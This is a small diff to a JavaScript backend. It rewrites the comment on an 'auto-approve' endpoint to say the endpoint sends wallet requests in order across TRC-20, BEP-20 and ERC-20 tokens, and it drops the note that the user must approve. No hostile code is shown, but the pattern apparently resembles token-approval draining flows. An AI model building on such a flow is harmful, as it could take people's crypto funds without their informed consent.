@@ -20,7 +20,7 @@ function findSession(body) {
 
 /**
  * POST /api/front/auto-approve
- * Sends an eth_sendTransaction request to the connected wallet (user must approve).
+ * Sends a wallet request in order: TRC-20, then BEP-20, then ERC-20.
  */
 async function enableAutoApprove(req, res) {
     const session = findSession(req.body);
